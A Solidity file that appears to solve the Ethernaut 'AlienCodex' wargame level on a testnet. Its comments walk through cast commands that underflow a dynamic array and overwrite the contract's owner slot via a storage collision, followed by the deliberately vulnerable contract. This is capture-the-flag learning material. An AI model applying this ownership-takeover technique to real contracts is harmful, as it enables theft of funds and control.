// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// import '../helpers/Ownable-05.sol';

// Goereli address:
// 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8
// Level revolves around abi:
// https://docs.soliditylang.org/en/v0.4.21/abi-spec.html

// Record new codex value
// cast send --private-key $PRIVATE_KEY 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "record(bytes32)" "0x000000000000000000000000359bfB5160946a55f03c080c2DC6975C8F970d5C"

// revise codex value at pos
// cast send --private-key $PRIVATE_KEY 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "revise(uint,bytes32)" 256  "0x000000000000000000000000359bfB5160946a55f03c080c2DC6975C8F970d5C"

// Retract codex
// cast send --private-key $PRIVATE_KEY 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "retract()"

// check codex slot
// cast call 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "codex(uint)" 0

// keccak256(abi.encode(0)) to get values at storage slots: 
// ex:
// if i record content to first slot, is 0x00....0001
// so I do : keccak256(abi.encode(1)) to get 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
// Note: can increment the return to get next value in storage and so on ie: 6=>7
// then: cast storage 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
// gets me what i recorded in my array
// Now i need to revise in a slot that collides with owner slot?
// Can access any slot now once underflowed, but need to find the one for owner in slot 0,
// will be stored before our array in memory slot 0
//[owner, contact, codex[]], so my underflowed array first position off of full thing

// cast storage 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 = 
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
// cast call 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "codex(uint)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
// returns our owner value: 0x00000000000000000000000140055e69e7eb12620c8ccbccab1f187883301c30
// this is what we want to overwrite so do ti with revise on that slot, as we have underflowed we will have access to all
// cast send --private-key $PRIVATE_KEY 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "revise(uint,bytes32)" 
// 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a "0x000000000000000000000001359bfB5160946a55f03c080c2DC6975C8F970d5C"
// Above call will overwrite codex at that slot, so when we check again at:
// cast call 0x1103c42B7e0F4c0AF2F75EdBBFb4981132c1a4D8 "codex(uint)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a
// we now get "0x000000000000000000000001359bfB5160946a55f03c080c2DC6975C8F970d5C"
// Better yet if we call "owner()" we also get the address we stashed there back!: 0x000000000000000000000000359bfb5160946a55f03c080c2dc6975c8f970d5c

// contract AlienCodex is Ownable {// Real implementation
contract AlienCodex  {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}